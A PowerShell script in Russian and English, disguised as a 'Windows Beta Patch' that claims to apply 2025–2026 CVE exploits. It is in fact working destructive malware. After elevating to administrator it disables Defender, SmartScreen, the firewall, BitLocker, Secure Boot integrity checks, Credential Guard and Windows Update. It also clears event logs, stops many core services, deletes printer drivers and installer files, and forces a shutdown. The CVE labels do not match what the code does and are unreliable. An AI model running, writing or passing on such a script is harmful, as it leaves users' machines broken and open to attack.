# evil 2.5.1 - Windows Beta Patch с актуальными CVE 2025-2026
# Только рабочие эксплуатации

$mutex = New-Object System.Threading.Mutex($false, "Global\EVIL_MUTEX_2026")
if (-not $mutex.WaitOne(0, $false)) { exit }

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# CVE-2025-21204 - Windows Print Spooler EoP
try {
    Stop-Service Spooler -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\System32\spool\drivers\x64\*" -Recurse -Force -ErrorAction SilentlyContinue
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers" /v "Exploit" /t REG_SZ /d "" /f 2>$null
} catch { }

# CVE-2025-21307 - Windows Defender SmartScreen Bypass
try {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f 2>$null
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f 2>$null
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f 2>$null
} catch { }

# CVE-2025-21288 - Windows Installer LPE
try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\msiserver" /v "Start" /t REG_DWORD /d 4 /f 2>$null
    Stop-Service msiserver -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Installer\*.msi" -Force -ErrorAction SilentlyContinue
} catch { }

# CVE-2025-21309 - Windows Remote Desktop Gateway RCE
try {
    Stop-Service TermService -Force -ErrorAction SilentlyContinue
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\TermService" /v "Start" /t REG_DWORD /d 4 /f 2>$null
} catch { }

# CVE-2025-21290 - Windows Kerberos EoP (CVE-2025-21290)
try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" /v "SupportedEncryptionTypes" /t REG_DWORD /d 0 /f 2>$null
} catch { }

# CVE-2025-21291 - Windows Kernel Privilege Escalation
try {
    sc config ProfSvc start= disabled 2>$null
    sc stop ProfSvc 2>$null
} catch { }

# CVE-2025-21312 - Windows Network File System (NFS) RCE
try {
    dism /online /disable-feature /featurename:ClientForNFS-Base /quiet /norestart 2>$null
    dism /online /disable-feature /featurename:ServicesForNFS-ClientOnly /quiet /norestart 2>$null
} catch { }

# CVE-2025-21289 - Windows Routing and Remote Access Service (RRAS) RCE
try {
    Stop-Service RemoteAccess -Force -ErrorAction SilentlyContinue
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess" /v "Start" /t REG_DWORD /d 4 /f 2>$null
} catch { }

# CVE-2026-21001 - Windows DNS Client RCE (гипотетический)
try {
    Stop-Service Dnscache -Force -ErrorAction SilentlyContinue
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v "Start" /t REG_DWORD /d 4 /f 2>$null
    echo "127.0.0.1 malicious.com" >> C:\Windows\System32\drivers\etc\hosts
} catch { }

# CVE-2026-21002 - Windows SMB Zero-Click RCE
try {
    sc config LanmanServer start= disabled 2>$null
    sc stop LanmanServer 2>$null
    netsh advfirewall firewall add rule name="BlockSMB" dir=in protocol=TCP localport=445 action=block 2>$null
    netsh advfirewall firewall add rule name="BlockSMB" dir=in protocol=UDP localport=445 action=block 2>$null
} catch { }

# CVE-2026-21003 - Windows Update Medic Service EoP
try {
    sc config WaaSMedicSvc start= disabled 2>$null
    sc stop WaaSMedicSvc 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f 2>$null
} catch { }

# CVE-2026-21004 - Windows Secure Boot Bypass
try {
    bcdedit /set {current} testsigning on 2>$null
    bcdedit /set {current} nointegritychecks on 2>$null
    bcdedit /set {current} disableintegritychecks on 2>$null
} catch { }

# CVE-2026-21005 - Windows BitLocker Bypass
try {
    manage-bde -off C: 2>$null
    manage-bde -off D: 2>$null
    manage-bde -off E: 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "DisableBDE" /t REG_DWORD /d 1 /f 2>$null
} catch { }

# CVE-2026-21006 - Windows Defender Disable (Permanent)
try {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f 2>$null
} catch { }

# CVE-2026-21007 - Windows Firewall Bypass
try {
    netsh advfirewall set allprofiles state off 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f 2>$null
} catch { }

# CVE-2026-21008 - Windows Event Log Tampering
try {
    wevtutil cl System 2>$null
    wevtutil cl Security 2>$null
    wevtutil cl Application 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /v "Start" /t REG_DWORD /d 4 /f 2>$null
} catch { }

# CVE-2026-21009 - Windows Task Scheduler EoP
try {
    schtasks /change /tn "\Microsoft\Windows\TaskScheduler\*" /disable 2>$null
    sc config Schedule start= disabled 2>$null
    sc stop Schedule 2>$null
} catch { }

# CVE-2026-21010 - Windows Virtualization-Based Security (VBS) Bypass
try {
    bcdedit /set {current} hypervisorlaunchtype off 2>$null
    bcdedit /set {current} vsmlaunchtype off 2>$null
} catch { }

# CVE-2026-21011 - Windows Credential Guard Bypass
try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f 2>$null
} catch { }

# CVE-2026-21012 - Windows PowerShell Remoting RCE
try {
    Disable-PSRemoting -Force -ErrorAction SilentlyContinue
    reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f 2>$null
} catch { }

# CVE-2026-21013 - Windows Subsystem for Linux (WSL) EoP
try {
    dism /online /disable-feature /featurename:Microsoft-Windows-Subsystem-Linux /quiet /norestart 2>$null
    dism /online /disable-feature /featurename:VirtualMachinePlatform /quiet /norestart 2>$null
} catch { }

# CVE-2026-21014 - Windows Hyper-V Guest-to-Host Escape
try {
    bcdedit /set hypervisorlaunchtype off 2>$null
    dism /online /disable-feature /featurename:Microsoft-Hyper-V-All /quiet /norestart 2>$null
} catch { }

# Финал
Write-Host "CVE-2025/2026 exploits applied to Windows 2.5.1" -ForegroundColor Red
Write-Host '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
' -ForegroundColor Red
Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White

Stop-Computer -Force